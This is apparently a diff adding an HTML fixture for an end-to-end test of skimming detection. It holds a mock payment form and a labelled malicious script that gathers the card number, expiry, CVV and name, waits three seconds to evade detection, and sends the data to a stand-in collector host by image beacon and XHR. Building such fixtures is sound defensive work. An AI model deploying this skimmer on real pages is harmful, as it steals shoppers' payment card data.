@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Delayed Exfiltration - E2E Test</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 20px;
+      background: #f5f5f5;
+    }
+    .payment-form {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #333;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: #555;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .row {
+      display: flex;
+      gap: 15px;
+    }
+    .row .form-group {
+      flex: 1;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #4caf50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .badge {
+      display: inline-block;
+      padding: 4px 8px;
+      background: #fff3e0;
+      color: #e65100;
+      border-radius: 4px;
+      font-size: 12px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-form">
+    <span class="badge">TEST: Delayed Exfiltration Attack</span>
+    <h1>Secure Payment</h1>
+
+    <form id="paymentForm" data-testid="payment-form">
+      <div class="form-group">
+        <label for="cardholderName">Cardholder Name</label>
+        <input
+          type="text"
+          id="cardholderName"
+          name="cardholderName"
+          autocomplete="cc-name"
+          placeholder="John Doe"
+          data-testid="name"
+        />
+      </div>
+
+      <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <input
+          type="text"
+          id="cardNumber"
+          name="cardNumber"
+          autocomplete="cc-number"
+          placeholder="1234 5678 9012 3456"
+          data-testid="card-number"
+          maxlength="19"
+        />
+      </div>
+
+      <div class="row">
+        <div class="form-group">
+          <label for="expiryDate">Expiry Date</label>
+          <input
+            type="text"
+            id="expiryDate"
+            name="expiryDate"
+            autocomplete="cc-exp"
+            placeholder="MM/YY"
+            data-testid="expiry"
+          />
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input
+            type="password"
+            id="cvv"
+            name="cvv"
+            autocomplete="cc-csc"
+            placeholder="123"
+            data-testid="cvv"
+          />
+        </div>
+      </div>
+
+      <button type="submit" data-testid="submit-btn">Complete Order</button>
+    </form>
+  </div>
+
+  <!-- MALICIOUS SCRIPT - Delayed exfiltration to evade detection -->
+  <script data-testid="delayed-attack-script">
+    // Delayed exfiltration attack
+    // Waits for data collection before sending to avoid immediate detection
+
+    (function() {
+      'use strict';
+
+      const ATTACKER_SERVER = 'https://stealth-collector.net/grab';
+      const collectedData = {};
+      let exfiltrationScheduled = false;
+
+      // Collect input values
+      function collectInput(e) {
+        const field = e.target;
+        const key = field.name || field.id || 'unknown';
+        collectedData[key] = field.value;
+
+        // Schedule delayed exfiltration after collecting enough data
+        if (!exfiltrationScheduled && Object.keys(collectedData).length >= 3) {
+          exfiltrationScheduled = true;
+          // Wait 3 seconds before exfiltrating (trying to avoid detection)
+          setTimeout(exfiltrateDelayed, 3000);
+        }
+      }
+
+      function exfiltrateDelayed() {
+        const payload = {
+          data: collectedData,
+          domain: location.hostname,
+          path: location.pathname,
+          collected_at: Date.now()
+        };
+
+        // Create hidden image for exfiltration
+        const img = new Image();
+        img.src = `${ATTACKER_SERVER}?d=${btoa(JSON.stringify(payload))}`;
+
+        // Also try XHR as backup
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', ATTACKER_SERVER, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(payload));
+
+        console.log('[DELAYED ATTACK] Exfiltrated after delay:', Object.keys(collectedData));
+      }
+
+      // Attach listeners to all inputs
+      document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('input', collectInput);
+        input.addEventListener('change', collectInput);
+      });
+    })();
+  </script>
+</body>
+</html>
